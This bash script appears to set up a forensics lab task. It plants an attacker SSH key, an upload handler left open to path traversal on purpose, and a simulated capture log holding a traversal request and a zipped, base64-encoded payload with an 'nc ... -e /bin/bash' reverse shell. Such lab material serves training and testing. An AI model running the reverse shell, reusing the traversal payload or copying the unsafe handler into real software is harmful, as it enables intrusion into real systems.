#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip zip unzip gawk coreutils
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/uploads
    mkdir -p /home/user/.ssh

    # Legitimate SSH key
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo LegitimateKey123 user@localhost" > /home/user/.ssh/authorized_keys
    # Attacker SSH key
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAaX/w/w+xX/x/xX/xX/xX/xX/xX/xX/xX/x attacker@evil.corp" >> /home/user/.ssh/authorized_keys

    # Vulnerable upload handler
    cat << 'EOF' > /home/user/upload_handler.sh
#!/bin/bash
# A simple upload handler
if [ -z "$FILENAME" ]; then
    echo "Error: FILENAME not set"
    exit 1
fi
cat /dev/stdin > "/home/user/uploads/$FILENAME"
echo "File uploaded to /home/user/uploads/$FILENAME"
EOF

    # Create the malicious payload and zip it with password 'fox'
    echo '#!/bin/bash' > /home/user/malware.sh
    echo 'echo "Executing reverse shell..."' >> /home/user/malware.sh
    echo 'nc 10.0.0.99 4444 -e /bin/bash' >> /home/user/malware.sh

    # Record the true hash
    sha256sum /home/user/malware.sh | awk '{print $1}' > /home/user/expected_hash.txt

    # Zip the payload
    zip -P fox -q /home/user/malware.zip /home/user/malware.sh
    rm /home/user/malware.sh

    # Generate the base64 string
    B64_ZIP=$(base64 -w 0 /home/user/malware.zip)
    rm /home/user/malware.zip

    # Create the network capture log
    cat << EOF > /home/user/network_capture.log
POST /upload HTTP/1.1
Host: server.local
X-Filename: ../../../home/user/.ssh/authorized_keys

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAaX/w/w+xX/x/xX/xX/xX/xX/xX/xX/xX/x attacker@evil.corp

---------------------------------------------------

POST /upload HTTP/1.1
Host: server.local
X-Filename: payload.zip.b64

$B64_ZIP
EOF

    chmod -R 777 /home/user
    chmod +x /home/user/upload_handler.sh
    chmod 700 /home/user/.ssh
    chmod 600 /home/user/.ssh/authorized_keys
